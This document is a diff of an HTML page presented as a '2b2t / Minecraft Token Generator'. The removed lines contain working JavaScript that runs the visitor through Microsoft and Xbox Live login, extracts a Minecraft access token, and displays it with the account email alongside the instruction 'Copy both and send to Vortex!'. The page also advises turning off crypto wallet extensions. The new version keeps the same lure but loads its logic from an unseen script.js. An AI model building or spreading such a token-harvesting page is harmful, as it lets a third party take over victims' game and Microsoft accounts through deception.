@@ -1,126 +1,14 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Minecraft Token Generator</title>
-  <style>
-    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f0f0f0; }
-    h1 { color: #333; }
-    button { padding: 12px 24px; font-size: 18px; cursor: pointer; background: #28a745; color: white; border: none; border-radius: 5px; }
-    button:hover { background: #218838; }
-    #output { margin-top: 20px; word-wrap: break-word; font-size: 16px; color: #333; }
-    .error { color: #dc3545; }
-  </style>
+  <meta charset="UTF-8">
+  <title>2b2t Token Generator</title>
 </head>
 <body>
-  <h1>Get Your Minecraft Token</h1>
-  <p>Click below to log in with your Microsoft account.</p>
-  <p>If it fails, try incognito mode or disable crypto extensions (e.g., Exodus, Phantom).</p>
-  <button onclick="startAuth()">Get Token</button>
-  <div id="output"></div>
-  <script>
-    const clientId = '00000000402b5328'; // Public Minecraft client ID
-    const redirectUri = window.location.origin + '/'; // Matches GitHub Pages URL
-    const output = document.getElementById('output');
-
-    function startAuth() {
-      output.innerHTML = 'Preparing login...';
-      const authUrl = `https://login.live.com/oauth20_authorize.srf?client_id=${clientId}&response_type=code&redirect_uri=${encodeURIComponent(redirectUri)}&scope=XboxLive.signin%20XboxLive.offline_access`;
-      window.location.href = authUrl;
-    }
-
-    async function handleCallback() {
-      const params = new URLSearchParams(window.location.search);
-      const code = params.get('code');
-      if (!code) return;
-
-      output.innerHTML = 'Fetching token...';
-      try {
-        // Step 1: Get Microsoft access token
-        const tokenResponse = await fetch('https://login.live.com/oauth20_token.srf', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-          body: new URLSearchParams({
-            client_id: clientId,
-            code,
-            grant_type: 'authorization_code',
-            redirect_uri: redirectUri,
-          }).toString(),
-        });
-        const tokenData = await tokenResponse.json();
-        if (tokenData.error) throw new Error(tokenData.error_description);
-        const accessToken = tokenData.access_token;
-
-        // Step 2: Xbox Live auth
-        const xboxResponse = await fetch('https://user.auth.xboxlive.com/user/authenticate', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-          body: JSON.stringify({
-            Properties: {
-              AuthMethod: 'RPS',
-              SiteName: 'user.auth.xboxlive.com',
-              RpsTicket: `t=${accessToken}`,
-            },
-            RelyingParty: 'http://auth.xboxlive.com',
-            TokenType: 'JWT',
-          }),
-        });
-        const xboxData = await xboxResponse.json();
-        if (xboxData.error) throw new Error(xboxData.error_description);
-        const xblToken = xboxData.Token;
-
-        // Step 3: XSTS token
-        const xstsResponse = await fetch('https://xsts.auth.xboxlive.com/xsts/authorize', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-          body: JSON.stringify({
-            Properties: {
-              SandboxId: 'RETAIL',
-              UserTokens: [xblToken],
-            },
-            RelyingParty: 'rp://api.minecraftservices.com/',
-            TokenType: 'JWT',
-          }),
-        });
-        const xstsData = await xstsResponse.json();
-        if (xstsData.error) throw new Error(xstsData.error_description);
-        const xstsToken = xstsData.Token;
-        const userHash = xstsData.DisplayClaims.xui[0].uhs;
-
-        // Step 4: Minecraft token
-        const mcResponse = await fetch('https://api.minecraftservices.com/authentication/login_with_xbox', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-          body: JSON.stringify({
-            identityToken: `XBL3.0 x=${userHash};${xstsToken}`,
-          }),
-        });
-        const mcData = await mcResponse.json();
-        if (mcData.error) throw new Error(mcData.error_description);
-        const mcToken = mcData.access_token;
-
-        // Try to get email (not always available)
-        const profileResponse = await fetch('https://api.minecraftservices.com/minecraft/profile', {
-          headers: { Authorization: `Bearer ${mcToken}` },
-        });
-        const profileData = await profileResponse.json();
-        const email = profileData.email || 'Unknown (use your Microsoft email)';
-
-        output.innerHTML = `
-          <p><strong>Email:</strong> ${email}</p>
-          <p><strong>Token:</strong> ${mcToken}</p>
-          <p>Copy both and send to Vortex!</p>
-        `;
-        // Clear URL params
-        window.history.replaceState({}, document.title, '/');
-      } catch (err) {
-        output.innerHTML = `<p class="error">Error: ${err.message}. Try incognito mode or disable crypto extensions.</p>`;
-      }
-    }
-
-    // Check for callback
-    if (window.location.search.includes('code=')) {
-      handleCallback();
-    }
-  </script>
+  <h1>2b2t Token Generator</h1>
+  <p>Click below to log in and get your Minecraft token:</p>
+  <button id="loginBtn">Get Token</button>
+  <pre id="output"></pre>
+  <script src="script.js"></script>
 </body>
 </html>
